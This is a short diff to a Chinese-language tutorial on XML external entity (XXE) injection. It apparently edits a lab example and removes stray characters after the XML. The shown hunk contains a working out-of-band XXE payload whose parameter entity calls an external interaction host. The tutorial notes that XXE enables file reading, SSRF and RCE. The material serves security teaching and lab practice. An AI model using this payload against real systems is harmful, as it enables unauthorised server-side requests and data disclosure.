@@ -58,7 +58,7 @@ XML实体即XML数据格式中用户自定义的变量,其必须在DTD中定义�
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://je1ulpppm7ftdo6vmgcv1lkg57bxzm.oastify.com"> %xxe; ]>
-<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>s'l
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```
 ### 外部实体注入
 XXE的原理也是因为DTD外部实体的特性导致可以文件读取,SSRF,RCE等.  
